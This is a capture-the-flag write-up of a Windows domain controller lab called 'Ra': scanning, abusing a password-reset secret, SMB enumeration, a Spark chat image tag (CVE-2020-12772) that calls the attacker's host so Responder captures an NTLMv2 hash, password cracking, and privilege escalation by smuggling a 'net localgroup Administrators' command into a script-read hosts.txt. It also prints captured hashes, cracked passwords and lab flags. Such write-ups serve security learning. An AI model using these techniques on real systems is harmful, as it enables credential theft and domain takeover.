
# CTF Writeup: Ra

---
## Reconaissance

An initial scan revealed the following running services on the target server.

```
nmap 10.114.178.18     
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-10 08:05 CDT
Nmap scan report for 10.114.178.18
Host is up (0.014s latency).
Not shown: 977 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
443/tcp  open  https
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
2179/tcp open  vmrdp
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5222/tcp open  xmpp-client
5269/tcp open  xmpp-server
5985/tcp open  wsman
7070/tcp open  realserver
7443/tcp open  oracleas-https
7777/tcp open  cbt
9090/tcp open  zeus-admin
9091/tcp open  xmltec-xmlmail

Nmap done: 1 IP address (1 host up) scanned in 10.96 seconds
```

Another scan revealed more detailled information about the running servers.

```
nmap -sCV 10.114.178.18    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-10 08:03 CDT
Nmap scan report for 10.114.178.18
Host is up (0.011s latency).
Not shown: 977 filtered tcp ports (no-response)
PORT     STATE SERVICE             VERSION
53/tcp   open  domain              Simple DNS Plus
80/tcp   open  http                Microsoft IIS httpd 10.0
|_http-title: Windcorp.
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec        Microsoft Windows Kerberos (server time: 2026-05-10 13:03:31Z)
135/tcp  open  msrpc               Microsoft Windows RPC
139/tcp  open  netbios-ssn         Microsoft Windows netbios-ssn
389/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|   Negotiate
|_  NTLM
| ssl-cert: Subject: commonName=Windows Admin Center
| Subject Alternative Name: DNS:WIN-2FAA40QQ70B
| Not valid before: 2020-04-30T14:41:03
|_Not valid after:  2020-06-30T14:41:02
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2026-05-10T13:04:39+00:00; -1s from scanner time.
| http-ntlm-info: 
|   Target_Name: WINDCORP
|   NetBIOS_Domain_Name: WINDCORP
|   NetBIOS_Computer_Name: FIRE
|   DNS_Domain_Name: windcorp.thm
|   DNS_Computer_Name: Fire.windcorp.thm
|   DNS_Tree_Name: windcorp.thm
|_  Product_Version: 10.0.17763
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
2179/tcp open  vmrdp?
3268/tcp open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
3389/tcp open  ms-wbt-server       Microsoft Terminal Services
| ssl-cert: Subject: commonName=Fire.windcorp.thm
| Not valid before: 2026-05-09T12:57:17
|_Not valid after:  2026-11-08T12:57:17
|_ssl-date: 2026-05-10T13:04:39+00:00; -1s from scanner time.
5222/tcp open  jabber
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     stream_id: 48vg84n8p3
|     xmpp: 
|       version: 1.0
|     errors: 
|       invalid-namespace
|       (timeout)
|     unknown: 
|     features: 
|     auth_mechanisms: 
|_    compression_methods: 
|_ssl-date: 2026-05-10T13:04:40+00:00; 0s from scanner time.
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
5269/tcp open  xmpp                Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     features: 
|     xmpp: 
|     errors: 
|       (timeout)
|     unknown: 
|     auth_mechanisms: 
|_    compression_methods: 
5985/tcp open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7070/tcp open  http                Jetty 9.4.18.v20190429
|_http-title: Openfire HTTP Binding Service
|_http-server-header: Jetty(9.4.18.v20190429)
7443/tcp open  ssl/http            Jetty 9.4.18.v20190429
|_http-title: Openfire HTTP Binding Service
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
|_http-server-header: Jetty(9.4.18.v20190429)
7777/tcp open  socks5              (No authentication; connection not allowed by ruleset)
| socks-auth-info: 
|_  No authentication
9090/tcp open  hadoop-datanode     Apache Hadoop
| hadoop-tasktracker-info: 
|_  Logs: jive-ibtn jive-btn-gradient
| hadoop-datanode-info: 
|_  Logs: jive-ibtn jive-btn-gradient
|_http-title: Site doesn't have a title (text/html).
9091/tcp open  ssl/hadoop-datanode Apache Hadoop
| hadoop-tasktracker-info: 
|_  Logs: jive-ibtn jive-btn-gradient
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
| hadoop-datanode-info: 
|_  Logs: jive-ibtn jive-btn-gradient
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5222-TCP:V=7.95%I=7%D=5/10%Time=6A008238%P=x86_64-pc-linux-gnu%r(RP
SF:CCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org/s
SF:treams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-stream
SF:s\"/></stream:error></stream:stream>");
Service Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-10T13:04:06
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.59 seconds
```

I moved on with inspecting the webpage. It seems to be an corporate webpage. Which could hint that the box itself is the DC. I pressed on the "Reset password" button and it opened a tab which tried to access the following domain:

![[Pasted image 20260510150720.png]]

Mapped this domain to the target ip in my local dns file.

```
echo "10.114.178.18 fire.windcorp.thm" | tee -a /etc/hosts
10.114.178.18 fire.windcorp.thm
```

I then was able to potentially change the password, but I had to paste an "secret" in it, so it works.

On the webpage there seems to be some usernames available.

![[Pasted image 20260510152407.png]]

I utilized the following curl command in order to grep all e-mails of the staff from the source code of the webpage.

```
curl -s http://windcorp.thm | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u
```

![[Pasted image 20260510155243.png]]

There is also another section of employees.

![[Pasted image 20260510155142.png]]

![[Pasted image 20260510155603.png]]

The source code reveals the names of the .jpg files. Which could hint on providing us an Secret for user Lily!

We successfully changed the password of user "lilyle". Using "lilyle" as username & the question favorite pet and secret "Sparky".

![[Pasted image 20260510155757.png]]

```
lilyle:ChangeMe#1234
```

We successfully authenticated against SMB with those credentials and enumerated Domain Users.

```
nxc smb 10.114.178.18 -u lilyle -p 'ChangeMe#1234' --rid-brute
```

Saved the nxc output into an users.txt file and ran the following command:

```
grep "SidTypeUser" users.txt | cut -d '\' -f2 | cut -d ' ' -f1 > newusers.txt
```

Enumerated SMB Shares with nxc.

```
nxc smb 10.114.178.18 -u lilyle -p 'ChangeMe#1234' --shares   
SMB         10.114.178.18   445    FIRE             [*] Windows 10 / Server 2019 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False)
SMB         10.114.178.18   445    FIRE             [+] windcorp.thm\lilyle:ChangeMe#1234 
SMB         10.114.178.18   445    FIRE             [*] Enumerated shares
SMB         10.114.178.18   445    FIRE             Share           Permissions     Remark
SMB         10.114.178.18   445    FIRE             -----           -----------     ------
SMB         10.114.178.18   445    FIRE             ADMIN$                          Remote Admin
SMB         10.114.178.18   445    FIRE             C$                              Default share
SMB         10.114.178.18   445    FIRE             IPC$            READ            Remote IPC
SMB         10.114.178.18   445    FIRE             NETLOGON        READ            Logon server share 
SMB         10.114.178.18   445    FIRE             Shared          READ            
SMB         10.114.178.18   445    FIRE             SYSVOL          READ            Logon server share 
SMB         10.114.178.18   445    FIRE             Users           READ
```

There seems to be an non-default SMB Share open called "Users" and an "Shared" and we have read access.

Connected to the SMB Share.

```
smbclient \\\\10.114.178.18/Users -U lilyle
Password for [WORKGROUP\lilyle]:
Try "help" to get a list of possible commands.
smb: \>
```

There is no relevant information stored, it's just the Users Share of the target server. But there seems to be all Users on the domain.

I downloaded the whole smb share onto my local machine.

```
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

![[Pasted image 20260510161533.png]]

Added those Usernames onto my "newusers.txt" wordlist.

Removed redundant inputs and saved the new wordlist into "newusers2.txt".

```
cat newusers.txt | sort -u > newusers2.txt
```

Moved onto "Shared" SMB Share.

Authenticated against SMB and found the first flag spark files.

```
smbclient \\\\windcorp.thm/Shared -U lilyle
Password for [WORKGROUP\lilyle]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri May 29 19:45:42 2020
  ..                                  D        0  Fri May 29 19:45:42 2020
  Flag 1.txt                          A       45  Fri May  1 10:32:36 2020
  spark_2_8_3.deb                     A 29526628  Fri May 29 19:45:01 2020
  spark_2_8_3.dmg                     A 99555201  Sun May  3 06:06:58 2020
  spark_2_8_3.exe                     A 78765568  Sun May  3 06:05:56 2020
  spark_2_8_3.tar.gz                  A 123216290  Sun May  3 06:07:24 2020

                15587583 blocks of size 4096. 10824846 blocks available
smb: \>
```

Downloaded everything onto local machine.

```
mget *
```

Retrieved first flag.

```
THM{466d52dc75a277d6c3f6c6fcbc716d6b62420f48}
```

## Initial Access

Searched up for vulnerabilities for spark 2.8.3 and found CVE-2020-12772, which allows us to retrieve an NTLM Hash.

Apparently I just need to unpack the .deb file and then connect to the spark client with our user lilyle. Set up responder, craft an image like the following:

```
<img src="http://10.10.14.66/a.png">
```

And sent it to everyone.

I had to move into the AttackBox, due to dependency issues.

```
dpkg -i spark_2_8_3.deb
```

Executed spark client.

```
spark
```

It's important to tick "accept all certfiicates" in Advanced Tab for it to work.

```
lilyle:ChangeMe#1234
```

This didn't work so I went to the official webpage and downloaded an more up-to-date version of the application.

```
https://www.igniterealtime.org/downloads/
```

Unpacked the tar file.

```
tar -xzf spark_3_0_2.tar.gz
```

Executed the application binary.

```
./Spark
```

![[Pasted image 20260510175317.png]]

Started a chat with user "Buse Candan".

Started up my responder.

```
responder -I tun0
```

Since we can utilize the exploit and append an src tag inside an imagefile. We paste the following in the chat with user buse.

```
<img src="http://192.168.227.246/a.png">
```

![[Pasted image 20260510185245.png]]

Retrieved NTLM Hash of user buse.

```
[HTTP] NTLMv2 Client   : 10.113.172.96
[HTTP] NTLMv2 Username : WINDCORP\buse
[HTTP] NTLMv2 Hash     : buse::WINDCORP:92b9741fd9f8ff1e:40C15CEB8B945A967F4FFE95F937AFE6:0101000000000000C658D6FF95E0DC011679F684F2A2DB6F0000000002000800450051005500460001001E00570049004E002D0046004F00320043004E005100550041004500360054000400140045005100550046002E004C004F00430041004C0003003400570049004E002D0046004F00320043004E005100550041004500360054002E0045005100550046002E004C004F00430041004C000500140045005100550046002E004C004F00430041004C000800300030000000000000000100000000200000B8283596B8544D370EF99B574CA2BC9817A787628FA21C796BA867815240912E0A00100000000000000000000000000000000000090000000000000000000000
```

Saved the hash into an file and ran john the ripper to bruteforce an password out of it.

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt      
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
uzunLM+3131      (buse)     
1g 0:00:00:01 DONE (2026-05-10 11:02) 0.8064g/s 2386Kp/s 2386Kc/s 2386KC/s v0yage..uya051
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Connected to the target server via evil-winrm.

```
evil-winrm -i windcorp.thm -u buse -p 'uzunLM+3131'       
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                           
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\buse\Documents>
```

Retrieved Flag 2.txt in C:\Users\buse\Desktop

```
THM{6f690fc72b9ae8dc25a24a104ed804ad06c7c9b1}
```

## Privilege Escalation

Enumerated non-default directory in the root directory named "scripts" and discovered an script called "checkservers.ps1" in which there is the user britannycr mentioned.

```
brittanycr@windcorp.thm
```

The script itself also has an section in which it requests the hosts.txt of user britannycr and executes (Invoke-Expression) what's inside of it. It also hints that the script is being executed as a scheduled task. We could potentially elevate our privileges in this way.

```
# from the list without touching the script/scheduled task,
# also hash/comment (#) out any hosts that are going for maintenance or are down.
get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match "#")} |
ForEach-Object {
    $p = "Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue"
    Invoke-Expression $p
```

We also enumerated that our current user is in the "Account Operator" Group which means we can change the password of users.

```
BUILTIN\Account Operators
```

Changed the password of user "brittancycr".

```
net user brittanycr Password123! /domain
The command completed successfully.
```

Sprayed the credentials against all services, but I couldn't get shell with this user. Since we need to modify the hosts.txt file inside her user directory, we somehow need to be able to do it. We could access SMB with her creds since the Users share is also in there!

We authenticated against SMB with user brittanycr.

Downloaded her hosts.txt file locally.

```
smbclient \\\\windcorp.thm/Users -U brittanycr
```

Modified the hosts.txt file on local machine and added the following command which should give our current user "buse" Administrator permissions.

```
; net localgroup Administrators buse /add
```

Connected to SMB again and put the new hosts.txt file into the share.

```
put hosts.txt
```

Since the script get's executed as an schedules task, our current user session should be in the Administrators group.

Retrieved Flag3.txt in C:\Users\Administrator\Desktop

```
THM{ba3a2bff2e535b514ad760c283890faae54ac2ef}
```

